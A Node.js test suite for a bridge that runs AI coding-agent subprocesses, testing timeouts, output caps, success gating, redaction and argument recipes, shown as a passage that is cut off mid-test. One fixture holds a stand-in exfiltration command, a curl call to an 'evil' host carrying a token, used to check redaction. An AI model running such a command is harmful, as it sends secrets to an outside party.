'use strict';

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawn } = require('node:child_process');

const FAKE_HAND = path.resolve(__dirname, 'fixtures/fakeHand.js');
const eb = require('../src/gep/execBridge');

// A spawnFn for runExecBridge: routes the Brain call (node index.js run) to a
// stub that prints a known sessions_spawn(...), and the Hand call to fakeHand.js
// in the mode the test wants. Records every spawn for assertions.
function makeSpawnFn({ handMode, brainTask = 'apply the patch', brainCode = 0, sentinel, calls }) {
  return (bin, args, opts) => {
    const isBrain = Array.isArray(args) && args.some((a) => String(a).endsWith('index.js')) && args.includes('run');
    if (calls) calls.push({ bin, args, isBrain, stdio: opts && opts.stdio, detached: opts && opts.detached });
    if (isBrain) {
      const line = require('../src/gep/bridge').renderSessionsSpawnCall({ task: brainTask, agentId: 'main', label: 'gep_test' });
      const code = brainCode === 0
        ? `process.stdout.write(${JSON.stringify('Starting...\n' + line + '\nEvolver finished.\n')}); process.exit(0);`
        : `process.stderr.write('brain boom\\n'); process.exit(${brainCode});`;
      return spawn(process.execPath, ['-e', code], { ...opts });
    }
    // Hand
    const env = { ...(opts && opts.env), FAKE_HAND_MODE: handMode };
    if (sentinel) env.FAKE_SENTINEL = sentinel;
    return spawn(process.execPath, [FAKE_HAND], { ...opts, env });
  };
}

let tmpRoot, prevEnv;
const ENV_KEYS = [
  'EVOLVE_HAND_TIMEOUT_MS', 'EVOLVE_BRAIN_TIMEOUT_MS', 'EVOLVE_HAND_KILL_GRACE_MS',
  'EVOLVE_HAND_MAX_RETRIES', 'EVOLVE_HAND_RETRY_BACKOFF_SECONDS', 'EVOLVE_IDLE_SLEEP_MS',
  'EVOLVE_HAND_MAX_BUF_BYTES', 'EVOLVE_HAND_QUIET',
  'EVOLVER_REPO_ROOT', 'CLAUDE_BIN', 'EVOLVE_EXEC_FALLBACKS',
  // P4-b
  'EVOLVE_OPENCODE_DANGEROUS', 'EVOLVE_HAND_DANGEROUS', 'EVOLVE_HAND_MODEL',
  'EVOLVE_SOLIDIFY_STATE_DIR', 'MEMORY_DIR', 'EVOLUTION_DIR',
];

beforeEach(() => {
  prevEnv = {};
  for (const k of ENV_KEYS) prevEnv[k] = process.env[k];
  tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'execbridge-'));
  process.env.EVOLVER_REPO_ROOT = tmpRoot;
  // make retries fast + deterministic
  process.env.EVOLVE_HAND_RETRY_BACKOFF_SECONDS = '0';
  process.env.EVOLVE_HAND_KILL_GRACE_MS = '300';
  delete require.cache[require.resolve('../src/gep/paths')];
});
afterEach(() => {
  for (const k of ENV_KEYS) { if (prevEnv[k] === undefined) delete process.env[k]; else process.env[k] = prevEnv[k]; }
  try { fs.rmSync(tmpRoot, { recursive: true, force: true }); } catch (_) {}
  delete require.cache[require.resolve('../src/gep/paths')];
});

describe('runChild — timeout & process safety', () => {
  it('hard-timeout kills a sleep_forever child and reports timedOut', async () => {
    const child = (bin, args, opts) => spawn(process.execPath, [FAKE_HAND], { ...opts, env: { ...(opts && opts.env), FAKE_HAND_MODE: 'sleep_forever' } });
    const r = await eb.runChild(child, 'node', [FAKE_HAND], { env: process.env, timeoutMs: 250, label: 'Hand' });
    assert.equal(r.timedOut, true);
    assert.notEqual(r.code, 0);
  });

  it('ENOENT bin resolves once with spawnError (no hang, no double-resolve)', async () => {
    let resolves = 0;
    const realSpawn = (bin, args, opts) => spawn(bin, args, opts);
    const p = eb.runChild(realSpawn, '/no/such/bin/xyz', [], { env: process.env, timeoutMs: 2000, label: 'Hand' });
    const r = await p.then((v) => { resolves++; return v; });
    assert.equal(resolves, 1);
    assert.ok(r.spawnError, 'spawnError set on ENOENT');
    assert.equal(r.code, null);
  });

  it('buffer cap holds even when a single chunk exceeds it (Bugbot #179)', async () => {
    // child emits one ~600KB chunk in a single write; cap is 64KB.
    process.env.EVOLVE_HAND_MAX_BUF_BYTES = String(64 * 1024);
    process.env.EVOLVE_HAND_QUIET = 'true';
    const big = (bin, args, opts) => spawn(process.execPath, ['-e',
      "process.stdout.write('X'.repeat(600*1024), () => process.exit(0));"], { ...opts });
    const r = await eb.runChild(big, 'node', ['-e', ''], { env: process.env, timeoutMs: 8000, label: 'Hand' });
    assert.ok(r.stdout.length <= 64 * 1024, `stdout retained ${r.stdout.length} > cap`);
    assert.equal(r.truncated, true);
  });

  it('head buffer mode keeps the early sessions_spawn line under flood (Bugbot #179 r2)', async () => {
    // Brain prints the spawn line FIRST, then floods >cap of prompt logging.
    // head mode must retain the spawn line; tail mode would drop it.
    process.env.EVOLVE_HAND_MAX_BUF_BYTES = String(32 * 1024);
    process.env.EVOLVE_HAND_QUIET = 'true';
    const line = require('../src/gep/bridge').renderSessionsSpawnCall({ task: 'T', agentId: 'main', label: 'gep_head' });
    const code = `process.stdout.write(${JSON.stringify(line + '\n')}); process.stdout.write('Z'.repeat(200*1024)); process.exit(0);`;
    const brainish = (bin, args, opts) => spawn(process.execPath, ['-e', code], { ...opts });
    const r = await eb.runChild(brainish, 'node', ['-e', ''], { env: process.env, timeoutMs: 8000, label: 'Brain', bufferMode: 'head' });
    assert.ok(r.stdout.length <= 32 * 1024, 'bounded to cap');
    assert.ok(r.truncated, 'truncation happened');
    const parsed = require('../src/gep/bridge').parseFirstSpawnCall(r.stdout);
    assert.ok(parsed && parsed.label === 'gep_head', 'spawn line survived the flood in head mode');
  });

  it('EVOLVE_HAND_QUIET=true mutes mirroring but still captures the buffer (#179 r6)', async () => {
    process.env.EVOLVE_HAND_QUIET = 'true';
    const writes = [];
    const orig = process.stdout.write.bind(process.stdout);
    process.stdout.write = (chunk, ...rest) => { writes.push(String(chunk)); return orig(chunk, ...rest); };
    try {
      const child = (bin, args, opts) => spawn(process.execPath, ['-e', "process.stdout.write('SECRET_OUTPUT_zzz');process.exit(0);"], { ...opts });
      const r = await eb.runChild(child, 'node', ['-e', ''], { env: process.env, timeoutMs: 4000, label: 'Hand' });
      assert.ok(r.stdout.includes('SECRET_OUTPUT_zzz'), 'buffer still captured');
      assert.ok(!writes.some((w) => w.includes('SECRET_OUTPUT_zzz')), 'mirrored output muted');
    } finally {
      process.stdout.write = orig;
      delete process.env.EVOLVE_HAND_QUIET;
    }
  });

  it('runChild passes cwd to the child (#179 r4: run in the evolution repo)', async () => {
    let seenOpts = null;
    const spy = (bin, args, opts) => { seenOpts = opts; return spawn(process.execPath, ['-e', 'process.exit(0)'], { ...opts }); };
    await eb.runChild(spy, 'node', ['-e', ''], { env: process.env, timeoutMs: 4000, label: 'X', cwd: '/tmp' });
    assert.equal(seenOpts.cwd, '/tmp', 'cwd forwarded to spawn');
  });

  it('clean exit-0 within grace is NOT a timeout (M3)', async () => {
    // sigterm handler writes status + exits 0 inside the kill grace window
    const sf = path.join(tmpRoot, 'm3_status.json');
    const child = (bin, args, opts) => spawn(process.execPath, [FAKE_HAND], { ...opts, env: { ...(opts && opts.env), FAKE_HAND_MODE: 'sigterm_writes_status_exit0', EVOLVE_STATUS_FILE: sf } });
    process.env.EVOLVE_HAND_KILL_GRACE_MS = '2000';
    const r = await eb.runChild(child, 'node', [FAKE_HAND], { env: process.env, timeoutMs: 200, label: 'Hand' });
    assert.equal(r.code, 0, 'child exited 0 on SIGTERM');
    assert.equal(r.timedOut, false, 'clean exit-0 cleared timedOut');
  });
});

describe('evaluateStatusGate', () => {
  const mk = (over) => ({ r: { code: 0, stdout: '', stderr: '', timedOut: false, spawnError: null }, statusFile: path.join(tmpRoot, 's.json'), cycleStartMs: Date.now(), ...over });

  it('success requires SOLIDIFY SUCCESS marker AND status result:"success" (#179 r3)', () => {
    const sf = path.join(tmpRoot, 'ok.json'); fs.writeFileSync(sf, JSON.stringify({ result: 'success', en: 'x', zh: 'y' }));
    const g = eb.evaluateStatusGate({ r: { code: 0, stdout: '[SOLIDIFY] SUCCESS', stderr: '', timedOut: false }, statusFile: sf, cycleStartMs: Date.now() });
    assert.equal(g.ok, true); assert.equal(g.kind, 'success');
  });
  it('NOT success: status file present but NO solidify marker (Hand skipped solidify) (#179 r3)', () => {
    const sf = path.join(tmpRoot, 'nomarker.json'); fs.writeFileSync(sf, JSON.stringify({ result: 'success' }));
    const g = eb.evaluateStatusGate({ r: { code: 0, stdout: 'did stuff, no solidify', stderr: '', timedOut: false }, statusFile: sf, cycleStartMs: Date.now() });
    assert.equal(g.ok, false); assert.equal(g.kind, 'no_solidify_marker');
  });
  it('NOT success: solidify ran but status result is "failure" (#179 r3)', () => {
    const sf = path.join(tmpRoot, 'fail.json'); fs.writeFileSync(sf, JSON.stringify({ result: 'failure' }));
    const g = eb.evaluateStatusGate({ r: { code: 0, stdout: '[SOLIDIFY] SUCCESS', stderr: '', timedOut: false }, statusFile: sf, cycleStartMs: Date.now() });
    assert.equal(g.ok, false); assert.equal(g.kind, 'status_failure');
  });
  it('solidify_failed', () => {
    const g = eb.evaluateStatusGate(mk({ r: { code: 1, stdout: '[SOLIDIFY] FAILED', stderr: '', timedOut: false } }));
    assert.equal(g.ok, false); assert.equal(g.kind, 'solidify_failed');
  });
  it('no_solidify_marker when no markers at all', () => {
    const g = eb.evaluateStatusGate(mk({ r: { code: 0, stdout: 'done', stderr: '', timedOut: false } }));
    assert.equal(g.ok, false); assert.equal(g.kind, 'no_solidify_marker');
  });
  it('no_status when solidify ran but status file missing', () => {
    const g = eb.evaluateStatusGate(mk({ r: { code: 0, stdout: '[SOLIDIFY] SUCCESS', stderr: '', timedOut: false } }));
    assert.equal(g.ok, false); assert.equal(g.kind, 'no_status');
  });
  it('reason does NOT leak raw transcript tail (#179 r3 security)', () => {
    const secret = 'SECRET_TOKEN_abc123';
    const g = eb.evaluateStatusGate(mk({ r: { code: 1, stdout: 'leaking ' + secret + ' everywhere', stderr: '', timedOut: false } }));
    assert.ok(!g.reason.includes(secret), 'classified reason must not embed raw stdout');
  });
  it('is_error reason keeps only subtype, not jr.result free text (#179 r4)', () => {
    const j = JSON.stringify({ type: 'result', is_error: true, subtype: 'error_max_turns', result: 'LEAK_SECRET_xyz token=abc' });
    const g = eb.evaluateStatusGate(mk({ r: { code: 0, stdout: j, stderr: '', timedOut: false } }));
    assert.equal(g.kind, 'nonzero');
    assert.ok(g.reason.includes('error_max_turns'));
    assert.ok(!g.reason.includes('LEAK_SECRET_xyz'), 'must not embed jr.result');
  });
  it('permission_denied reason keeps only tool names, not tool_input (#179 r4)', () => {
    const j = JSON.stringify({ type: 'result', is_error: false, permission_denials: [{ tool_name: 'Bash', tool_input: { command: 'curl http://evil?token=SECRET123' } }] });
    const g = eb.evaluateStatusGate(mk({ r: { code: 0, stdout: j, stderr: '', timedOut: false } }));
    assert.equal(g.kind, 'permission_denied');
    assert.ok(g.reason.includes('Bash'));
    assert.ok(!g.reason.includes('SECRET123'), 'must not embed tool_input command');
  });
  it('permission_denied from parsed claude json', () => {
    const j = JSON.stringify({ type: 'result', is_error: false, permission_denials: [{ tool_name: 'Bash' }], result: '' });
    const g = eb.evaluateStatusGate(mk({ r: { code: 0, stdout: '[Hand] ' + j, stderr: '', timedOut: false } }));
    assert.equal(g.ok, false); assert.equal(g.kind, 'permission_denied');
  });
  it('nonzero on claude is_error', () => {
    const j = JSON.stringify({ type: 'result', is_error: true, subtype: 'error_max_turns', result: '' });
    const g = eb.evaluateStatusGate(mk({ r: { code: 0, stdout: j, stderr: '', timedOut: false } }));
    assert.equal(g.ok, false); assert.equal(g.kind, 'nonzero');
  });
  it('timeout only honored AFTER success check fails', () => {
    const g = eb.evaluateStatusGate(mk({ r: { code: null, stdout: '', stderr: '', timedOut: true } }));
    assert.equal(g.ok, false); assert.equal(g.kind, 'timeout');
  });
  it('spawn_error', () => {
    const g = eb.evaluateStatusGate(mk({ r: { code: null, stdout: '', stderr: '', timedOut: false, spawnError: 'ENOENT' } }));
    assert.equal(g.ok, false); assert.equal(g.kind, 'spawn_error');
  });

  // --- P4-b: solidifyProof:'state' (codex/opencode) — gate keys on the evolver-
  // written evolution_solidify_state.json instead of the stdout marker. paths.js
  // resolves getEvolutionDir() under tmpRoot via EVOLVER_REPO_ROOT (set in beforeEach). ---
  const stateDir = () => { delete require.cache[require.resolve('../src/gep/paths')]; return require('../src/gep/paths').getEvolutionDir(); };
  const writeState = (over) => {
    const dir = stateDir();
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'evolution_solidify_state.json'),
      JSON.stringify({ last_solidify: { run_id: 'r', at: new Date().toISOString(), outcome: { status: 'success', score: 1 }, ...over } }));
  };

  it("state proof: fresh success state + status:'success' + NO stdout marker -> ok", () => {
    const attemptStartMs = Date.now() - 1000;
    writeState();
    const sf = path.join(tmpRoot, 'st.json'); fs.writeFileSync(sf, JSON.stringify({ result: 'success' }));
    const g = eb.evaluateStatusGate({ r: { code: 0, stdout: '{"type":"message"}', stderr: 'codex banner', timedOut: false }, statusFile: sf, cycleStartMs: attemptStartMs, attemptStartMs, solidifyProof: 'state' });
    assert.equal(g.ok, true); assert.equal(g.kind, 'success');
  });
  it('state proof: STALE state (at < attemptStartMs) -> no_solidify_marker', () => {
    const dir = stateDir(); fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'evolution_solidify_state.json'),
      JSON.stringify({ last_solidify: { at: new Date(Date.now() - 60000).toISOString(), outcome: { status: 'success' } } }));
    const sf = path.join(tmpRoot, 'st.json'); fs.writeFileSync(sf, JSON.stringify({ result: 'success' }));
    const g = eb.evaluateStatusGate({ r: { code: 0, stdout: '', stderr: '', timedOut: false }, statusFile: sf, cycleStartMs: Date.now(), attemptStartMs: Date.now(), solidifyProof: 'state' });
    assert.equal(g.ok, false); assert.equal(g.kind, 'no_solidify_marker');
  });
  it('state proof: success state WITH skip_reason (PR-overlap rollback) -> NOT success', () => {
    const attemptStartMs = Date.now() - 1000;
    writeState({ outcome: { status: 'success', skip_reason: 'open_pr_overlap' } });
    const sf = path.join(tmpRoot, 'st.json'); fs.writeFileSync(sf, JSON.stringify({ result: 'success' }));
    const g = eb.evaluateStatusGate({ r: { code: 0, stdout: '', stderr: '', timedOut: false }, statusFile: sf, cycleStartMs: attemptStartMs, attemptStartMs, solidifyProof: 'state' });
    assert.equal(g.ok, false); assert.equal(g.kind, 'no_solidify_marker');
  });
  it('state proof: absent state file -> no_solidify_marker', () => {
    const sf = path.join(tmpRoot, 'st.json'); fs.writeFileSync(sf, JSON.stringify({ result: 'success' }));
    const g = eb.evaluateStatusGate({ r: { code: 0, stdout: '', stderr: '', timedOut: false }, statusFile: sf, cycleStartMs: Date.now(), attemptStartMs: Date.now(), solidifyProof: 'state' });
    assert.equal(g.ok, false); assert.equal(g.kind, 'no_solidify_marker');
  });
  it('Fallback B (EVOLVE_EXEC_FALLBACKS): rejects a fresh success state WITH skip_reason (Bugbot #184)', () => {
    // Fallback B must apply the SAME criteria as the primary state proof — a
    // PR-overlap rollback (status:'success'+skip_reason) the primary gate rejects
    // must NOT slip through as success_fallback_b.
    process.env.EVOLVE_EXEC_FALLBACKS = 'true';
    try {
      const attemptStartMs = Date.now() - 1000;
      writeState({ outcome: { status: 'success', skip_reason: 'open_pr_overlap' } });
      // No status file + no stdout marker -> primary gate fails; only Fallback B could pass.
      const g = eb.evaluateStatusGate({ r: { code: 0, stdout: 'done', stderr: '', timedOut: false }, statusFile: path.join(tmpRoot, 'none.json'), cycleStartMs: attemptStartMs, attemptStartMs });
      assert.notEqual(g.kind, 'success_fallback_b', 'rollback w/ skip_reason must not pass Fallback B');
      assert.equal(g.ok, false);
    } finally { delete process.env.EVOLVE_EXEC_FALLBACKS; }
  });
  it('Fallback A is SKIPPED for solidifyProof:state — stdout marker alone cannot pass codex/opencode (Bugbot #184)', () => {
    // codex/opencode distrust the stdout marker; Fallback A must not re-introduce
    // it. With a [SOLIDIFY] SUCCESS marker but NO fresh state file, a 'state'
    // harness must NOT close as success_fallback_a (nor _b).
    process.env.EVOLVE_EXEC_FALLBACKS = 'true';
    try {
      const g = eb.evaluateStatusGate({ r: { code: 0, stdout: '[SOLIDIFY] SUCCESS\n{"type":"EvolutionEvent"}\n{"type":"Capsule"}', stderr: '', timedOut: false }, statusFile: path.join(tmpRoot, 'none.json'), cycleStartMs: Date.now(), attemptStartMs: Date.now(), solidifyProof: 'state' });
      assert.notEqual(g.kind, 'success_fallback_a', 'stdout marker must not pass Fallback A for state harnesses');
      assert.equal(g.ok, false);
    } finally { delete process.env.EVOLVE_EXEC_FALLBACKS; }
  });
  it('Fallback A STILL works for claude-code (stdout marker, solidifyProof omitted) (regression)', () => {
    process.env.EVOLVE_EXEC_FALLBACKS = 'true';
    try {
      const g = eb.evaluateStatusGate({ r: { code: 0, stdout: '[SOLIDIFY] SUCCESS', stderr: '', timedOut: false }, statusFile: path.join(tmpRoot, 'fa.json'), cycleStartMs: Date.now(), attemptStartMs: Date.now() });
      assert.equal(g.ok, true); assert.equal(g.kind, 'success_fallback_a');
    } finally { delete process.env.EVOLVE_EXEC_FALLBACKS; }
  });
  it('Fallback B (EVOLVE_EXEC_FALLBACKS): accepts a clean fresh success state (no skip_reason)', () => {
    process.env.EVOLVE_EXEC_FALLBACKS = 'true';
    try {
      const attemptStartMs = Date.now() - 1000;
      writeState(); // clean success, fresh
      const g = eb.evaluateStatusGate({ r: { code: 0, stdout: 'done', stderr: '', timedOut: false }, statusFile: path.join(tmpRoot, 'none.json'), cycleStartMs: attemptStartMs, attemptStartMs });
      assert.equal(g.ok, true); assert.equal(g.kind, 'success_fallback_b');
    } finally { delete process.env.EVOLVE_EXEC_FALLBACKS; }
  });
  it("REGRESSION: claude-code (solidifyProof omitted) STILL keys on the stdout marker, NOT state", () => {
    // a stale/absent state must not matter; the stdout marker drives claude success.
    const sf = path.join(tmpRoot, 'st.json'); fs.writeFileSync(sf, JSON.stringify({ result: 'success' }));
    const g = eb.evaluateStatusGate({ r: { code: 0, stdout: '[SOLIDIFY] SUCCESS', stderr: '', timedOut: false }, statusFile: sf, cycleStartMs: Date.now() });
    assert.equal(g.ok, true); assert.equal(g.kind, 'success');
  });
});

describe('tryParseClaudeResult — M5 (last result line, not substring)', () => {
  it('parses the final result doc, ignoring free-text that contains "type":"result"', () => {
    const stdout = '[Hand] some log with "type":"result" inside prose\n[Hand] ' +
      JSON.stringify({ type: 'result', is_error: false, result: 'ok', permission_denials: [] });
    const o = eb.tryParseClaudeResult(stdout);
    assert.equal(o.is_error, false);
    assert.equal(o.result, 'ok');
  });
  it('returns null when no result doc', () => {
    assert.equal(eb.tryParseClaudeResult('just logs\nno json'), null);
  });
});

describe('resolveBin', () => {
  it('env override wins', () => {
    process.env.CLAUDE_BIN = '/custom/claude';
    assert.equal(eb.resolveBin('claude-code'), '/custom/claude');
  });
});

describe('RECIPES.buildArgs contract', () => {
  it('claude-code: stdin delivery, valid uuid session, settings + allowedTools present', () => {
    const built = eb.RECIPES['claude-code'].buildArgs({ sessionId: '11111111-1111-4111-8111-111111111111', statusFile: '/s.json', cycleTag: '0001', settingsPath: '/set.json' });
    assert.equal(eb.RECIPES['claude-code'].deliversTaskVia, 'stdin');
    assert.ok(built.args.includes('-p') && built.args.includes('--output-format'));
    assert.ok(built.args.includes('--settings') && built.args.includes('/set.json'));
    assert.ok(built.args.includes('--allowedTools'));
    const sid = built.args[built.args.indexOf('--session-id') + 1];
    assert.match(sid, /^[0-9a-f-]{36}$/);
    assert.ok(!built.args.join(' ').includes('apply the patch'), 'task NOT in argv for stdin recipe');
  });
  it('openclaw: task via argv -m', () => {
    const built = eb.RECIPES['openclaw'].buildArgs({ sessionId: 'sid', statusFile: '/s.json', cycleTag: '0001', taskText: 'TASKBODY' });
    assert.equal(eb.RECIPES['openclaw'].deliversTaskVia, 'argv');
    assert.ok(built.args.includes('-m') && built.args.includes('TASKBODY'));
  });

  // --- P4-b: codex ---
  it('codex: stdin delivery, workspace-write sandbox, state proof, add-dir, no task in argv', () => {
    const built = eb.RECIPES['codex'].buildArgs({ statusFile: '/s.json', cycleTag: '0001', taskText: 'apply the patch' });
    assert.equal(eb.RECIPES['codex'].deliversTaskVia, 'stdin');
    assert.equal(eb.RECIPES['codex'].solidifyProof, 'state');
    assert.equal(built.args[0], 'exec');
    const i = built.args.indexOf('-s');
    assert.ok(i >= 0 && built.args[i + 1] === 'workspace-write', '-s workspace-write by default');
    assert.ok(built.args.includes('-c') && built.args.includes('approval_policy=never'));
    assert.ok(built.args.includes('-C'), '-C working root');
    assert.ok(built.args.includes('--add-dir'), '--add-dir getEvolutionDir() (unconditional)');
    assert.ok(built.args.includes('--skip-git-repo-check') && built.args.includes('--ephemeral'));
    assert.ok(!built.args.includes('--session-id'), 'codex has no --session-id');
    assert.ok(!built.args.includes('--dangerously-bypass-approvals-and-sandbox'), 'not bypass by default');
    assert.ok(!built.args.join(' ').includes('apply the patch'), 'task NOT in argv for stdin recipe');
  });
  it('codex: EVOLVE_HAND_DANGEROUS=true escalates to danger-full-access', () => {
    process.env.EVOLVE_HAND_DANGEROUS = 'true';
    const built = eb.RECIPES['codex'].buildArgs({ statusFile: '/s.json', cycleTag: '0001' });
    const i = built.args.indexOf('-s');
    assert.equal(built.args[i + 1], 'danger-full-access');
  });
  it('codex: -m only forwarded when EVOLVE_HAND_MODEL is set', () => {
    const noModel = eb.RECIPES['codex'].buildArgs({ statusFile: '/s.json', cycleTag: '0001' });
    assert.ok(!noModel.args.includes('-m'), 'no -m without EVOLVE_HAND_MODEL');
    process.env.EVOLVE_HAND_MODEL = 'gpt-5-codex';
    const withModel = eb.RECIPES['codex'].buildArgs({ statusFile: '/s.json', cycleTag: '0001' });
    assert.ok(withModel.args.includes('-m') && withModel.args.includes('gpt-5-codex'));
  });

  // --- P4-b: opencode ---
  it('opencode: argv delivery, taskText last after --, skip-permissions, state proof, no --format', () => {
    const built = eb.RECIPES['opencode'].buildArgs({ statusFile: '/s.json', cycleTag: '0001', taskText: 'TASKBODY-oc' });
    assert.equal(eb.RECIPES['opencode'].deliversTaskVia, 'argv');
    assert.equal(eb.RECIPES['opencode'].solidifyProof, 'state');
    assert.equal(built.args[0], 'run');
    assert.equal(built.args[built.args.length - 1], 'TASKBODY-oc', 'task is the LAST argv element');
    assert.equal(built.args[built.args.length - 2], '--', '-- guards a leading-dash task');
    assert.ok(built.args.includes('--dangerously-skip-permissions'));
    assert.ok(built.args.includes('--dir'));
    assert.ok(!built.args.includes('--format'), 'no --format json (default relays to stdout)');
  });
});

describe('runExecBridge loop', () => {
  it('BLOCKER PROOF: a hung Hand is killed by timeout and counts as a retry (not infinite)', async () => {
    process.env.EVOLVE_HAND_TIMEOUT_MS = '250';
    process.env.EVOLVE_HAND_MAX_RETRIES = '2';
    const calls = [];
    const spawnFn = makeSpawnFn({ handMode: 'sleep_forever', calls });
    const res = await eb.runExecBridge({ harness: 'claude-code', once: true, spawnFn });
    assert.equal(res.lastOutcome, 'hand_failed');
    const handCalls = calls.filter((c) => !c.isBrain);
    assert.equal(handCalls.length, 2, 'exactly MAX_RETRIES Hand spawns, then stop — not infinite');
  });

  it('success: Hand writes status + SOLIDIFY SUCCESS -> lastOutcome success, 1 Hand spawn', async () => {
    process.env.EVOLVE_HAND_TIMEOUT_MS = '8000';
    process.env.EVOLVE_HAND_MAX_RETRIES = '3';
    const calls = [];
    const spawnFn = makeSpawnFn({ handMode: 'exit_ok_status', calls });
    const res = await eb.runExecBridge({ harness: 'claude-code', once: true, spawnFn });
    assert.equal(res.lastOutcome, 'success');
    assert.equal(calls.filter((c) => !c.isBrain).length, 1, 'stopped after first success');
  });

  it('retry exhaustion: solidify_fail spawns exactly MAX_RETRIES then hand_failed', async () => {
    process.env.EVOLVE_HAND_TIMEOUT_MS = '8000';
    process.env.EVOLVE_HAND_MAX_RETRIES = '3';
    const calls = [];
    const spawnFn = makeSpawnFn({ handMode: 'solidify_fail', calls });
    const res = await eb.runExecBridge({ harness: 'claude-code', once: true, spawnFn });
    assert.equal(res.lastOutcome, 'hand_failed');
    assert.equal(calls.filter((c) => !c.isBrain).length, 3);
  });

  it('permission-broken Hand: classified, retried, then hand_failed (never hangs)', async () => {
    process.env.EVOLVE_HAND_TIMEOUT_MS = '8000';
    process.env.EVOLVE_HAND_MAX_RETRIES = '2';
    const calls = [];
    const spawnFn = makeSpawnFn({ handMode: 'perm_denied', calls });
    const res = await eb.runExecBridge({ harness: 'claude-code', once: true, spawnFn });
    assert.equal(res.lastOutcome, 'hand_failed');
    assert.equal(calls.filter((c) => !c.isBrain).length, 2);
  });

  it('no_spawn: Brain prints nothing parseable -> lastOutcome no_spawn, no Hand spawn', async () => {
    const calls = [];
    // brainTask irrelevant; override brain to print a non-spawn line by using brainCode!=0 path? No — use a custom spawnFn.
    const spawnFn = (bin, args, opts) => {
      const isBrain = args.some((a) => String(a).endsWith('index.js')) && args.includes('run');
      calls.push({ isBrain });
      if (isBrain) return spawn(process.execPath, ['-e', 'process.stdout.write("no spawn here\\n");process.exit(0);'], { ...opts });
      return spawn(process.execPath, [FAKE_HAND], { ...opts });
    };
    const res = await eb.runExecBridge({ harness: 'claude-code', once: true, spawnFn });
    assert.equal(res.lastOutcome, 'no_spawn');
    assert.equal(calls.filter((c) => !c.isBrain).length, 0, 'no Hand spawned when Brain emits no sessions_spawn');
  });

  it('brain_failed: non-zero Brain exit -> lastOutcome brain_failed, no Hand spawn', async () => {
    const calls = [];
    const spawnFn = makeSpawnFn({ handMode: 'exit_ok_status', brainCode: 1, calls });
    const res = await eb.runExecBridge({ harness: 'claude-code', once: true, spawnFn });
    assert.equal(res.lastOutcome, 'brain_failed');
    assert.equal(calls.filter((c) => !c.isBrain).length, 0);
  });

  it('multi-cycle: a later cycle failure is NOT masked by an earlier success (#179 r5)', async () => {
    // cycle 1 Hand succeeds, cycle 2 Hand fails -> run outcome must be the LAST
    // cycle (hand_failed), so the exec CLI exits non-zero.
    process.env.EVOLVE_HAND_TIMEOUT_MS = '8000';
    process.env.EVOLVE_HAND_MAX_RETRIES = '1';
    let cycle = 0;
    const spawnFn = (bin, args, opts) => {
      const isBrain = args.some((a) => String(a).endsWith('index.js')) && args.includes('run');
      if (isBrain) {
        cycle++;
        const line = require('../src/gep/bridge').renderSessionsSpawnCall({ task: 'do it', agentId: 'main', label: 'gep_c' + cycle });
        return spawn(process.execPath, ['-e', `process.stdout.write(${JSON.stringify(line + '\n')});process.exit(0);`], { ...opts });
      }
      // Hand: cycle 1 succeeds, cycle 2 fails
      const mode = cycle === 1 ? 'exit_ok_status' : 'solidify_fail';
      return spawn(process.execPath, [FAKE_HAND], { ...opts, env: { ...(opts && opts.env), FAKE_HAND_MODE: mode } });
    };
    const res = await eb.runExecBridge({ harness: 'claude-code', maxCycles: 2, spawnFn });
    assert.equal(res.cycles, 2);
    assert.equal(res.lastOutcome, 'hand_failed', 'last cycle failure wins; earlier success must not mask it');
  });

  // --- P4-b loop tests ---
  it('opencode: refuses FAIL-FAST without EVOLVE_OPENCODE_DANGEROUS, before any Brain run', async () => {
    delete process.env.EVOLVE_OPENCODE_DANGEROUS;
    const calls = [];
    const spawnFn = makeSpawnFn({ handMode: 'state_proof_success', calls });
    await assert.rejects(
      () => eb.runExecBridge({ harness: 'opencode', once: true, spawnFn }),
      /EVOLVE_OPENCODE_DANGEROUS/,
    );
    assert.equal(calls.length, 0, 'must refuse BEFORE spawning the Brain (no wasted cycle)');
  });

  it("codex: cycle closes on solidifyProof:'state' with NO stdout marker", async () => {
    process.env.EVOLVE_HAND_TIMEOUT_MS = '8000';
    process.env.EVOLVE_HAND_MAX_RETRIES = '3';
    // the fake codex Hand writes the solidify state under getEvolutionDir()
    delete require.cache[require.resolve('../src/gep/paths')];
    process.env.EVOLVE_SOLIDIFY_STATE_DIR = require('../src/gep/paths').getEvolutionDir();
    const calls = [];
    const spawnFn = makeSpawnFn({ handMode: 'state_proof_success', calls });
    const res = await eb.runExecBridge({ harness: 'codex', once: true, spawnFn });
    assert.equal(res.lastOutcome, 'success', 'state proof closes the cycle without a stdout marker');
    assert.equal(calls.filter((c) => !c.isBrain).length, 1, 'one Hand spawn, stopped after success');
  });

  it('codex: NO state file written -> hand_failed (state proof is not weakened)', async () => {
    process.env.EVOLVE_HAND_TIMEOUT_MS = '8000';
    process.env.EVOLVE_HAND_MAX_RETRIES = '1';
    delete process.env.EVOLVE_SOLIDIFY_STATE_DIR; // fake Hand writes status but NOT state
    const calls = [];
    const spawnFn = makeSpawnFn({ handMode: 'state_proof_success', calls });
    const res = await eb.runExecBridge({ harness: 'codex', once: true, spawnFn });
    assert.equal(res.lastOutcome, 'hand_failed', 'no fresh solidify state => not a success');
  });

  it('opencode: with EVOLVE_OPENCODE_DANGEROUS=true, cycle closes on state proof', async () => {
    process.env.EVOLVE_HAND_TIMEOUT_MS = '8000';
    process.env.EVOLVE_HAND_MAX_RETRIES = '3';
    process.env.EVOLVE_OPENCODE_DANGEROUS = 'true';
    delete require.cache[require.resolve('../src/gep/paths')];
    process.env.EVOLVE_SOLIDIFY_STATE_DIR = require('../src/gep/paths').getEvolutionDir();
    const calls = [];
    const spawnFn = makeSpawnFn({ handMode: 'state_proof_success', calls });
    const res = await eb.runExecBridge({ harness: 'opencode', once: true, spawnFn });
    assert.equal(res.lastOutcome, 'success');
    assert.equal(calls.filter((c) => !c.isBrain).length, 1);
  });
});

describe('writeScopedSettings', () => {
  it('writes valid JSON with allow/deny and round-trip parses', () => {
    const p = eb.writeScopedSettings();
    const j = JSON.parse(fs.readFileSync(p, 'utf8'));
    assert.ok(Array.isArray(j.permissions.allow));
    assert.ok(j.permissions.allow.includes('Edit'));
    assert.ok(j.permissions.deny.includes('WebFetch'));
